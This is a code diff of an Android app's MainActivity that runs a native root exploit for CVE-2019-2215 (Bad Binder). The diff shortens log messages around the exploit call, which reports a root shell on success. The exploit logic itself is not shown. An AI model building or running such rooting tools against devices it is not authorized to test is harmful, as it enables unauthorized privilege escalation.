@@ -163,24 +163,24 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== CVE-2019-2215 FINAL EXPLOIT ==========");
+        appendLog("========== CVE-2019-2215 FINAL ==========");
 
-        appendLog("[*] Triggering Bad Binder exploit with auto offset detection...");
-        appendLog("[!] WARNING: This may crash the device");
+        appendLog("[*] Triggering exploit with epoll_wait...");
+        appendLog("[!] May crash if offsets are incorrect");
 
         int result = nativeExploitCVE20192215();
 
         if (result == 0) {
-            appendLog("[+] Exploit SUCCESS! Root shell should be available.");
-            appendLog("[+] Check /data/local/tmp/ for root shell");
+            appendLog("[+] Exploit SUCCESS! Root shell available.");
+            appendLog("[+] Check /data/local/tmp/root.log");
         } else if (result == -1) {
             appendLog("[-] Exploit FAILED: Permission denied");
         } else if (result == -2) {
-            appendLog("[-] Exploit FAILED: Device not vulnerable or offset detection failed");
+            appendLog("[-] Exploit FAILED: Offset detection failed");
         } else if (result == -3) {
             appendLog("[-] Exploit FAILED: Kernel panic detected");
         } else {
-            appendLog("[-] Exploit returned unknown code: " + result);
+            appendLog("[-] Exploit returned: " + result);
         }
 
         appendLog("========== EXPLOIT COMPLETED ==========");
@@ -220,13 +220,13 @@ public class MainActivity extends AppCompatActivity {
             File dir = getDumpDir();
             File file = new File(dir, "cve_2019_2215_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== CVE-2019-2215 Exploit Log ===");
+                pw.println("=== CVE-2019-2215 Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
                 pw.flush();
             }
-            appendLog("Log saved to " + file.getAbsolutePath());
+            appendLog("Log saved");
         } catch (Exception e) {
             appendLog("Save failed: " + e.getMessage());
         }
